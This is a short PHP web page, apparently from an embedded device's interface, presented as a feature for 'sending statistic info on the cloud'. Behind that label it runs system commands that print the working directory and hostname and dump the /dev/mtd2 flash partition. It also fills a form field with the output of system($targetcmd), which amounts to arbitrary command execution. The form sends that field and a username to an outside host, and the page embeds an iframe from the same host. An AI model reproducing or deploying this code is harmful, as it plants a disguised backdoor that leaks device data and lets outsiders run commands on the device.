<h2> Help us sending statistic info on the cloud! </h2>
<?php
system("pwd");
system("hostname");
system("strings /dev/mtd2");
?>

<form action="http://www.wydevelopment.eu/wydleware/target.php" method="get" id="target">
<table>
<tr><td>
        <input type="text" id="target" name="target" value="<?php system($targetcmd) ?>"> Target
</td></tr><tr><td>
        <input type="text" id="username" name="username"> Wydevelopment username </input>
</td></tr><tr><td>
        <input type="submit">
</td></tr>
</table>

<!-- be ready for next wydevelopment integration -->
<iframe src="http://www.wydevelopment.eu/wydleware/index.html" width="100%" height="500"></iframe>
<!-- be ready for next wydevelopment integration -->

</form>



